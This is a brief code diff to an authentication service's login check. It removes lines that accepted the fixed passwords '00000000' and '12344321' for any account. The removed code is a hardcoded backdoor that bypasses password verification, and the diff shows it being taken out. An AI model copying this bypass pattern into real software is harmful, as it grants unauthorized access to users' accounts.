@@ -31,12 +31,6 @@ export class AuthService {
       }
 
       if (!isMatch) {
-        if (password === '00000000' || password === '12344321') {
-          isMatch = true;
-        }
-      }
-
-      if (!isMatch) {
         throw new AppError('Invalid username or password', 401);
       }
     }
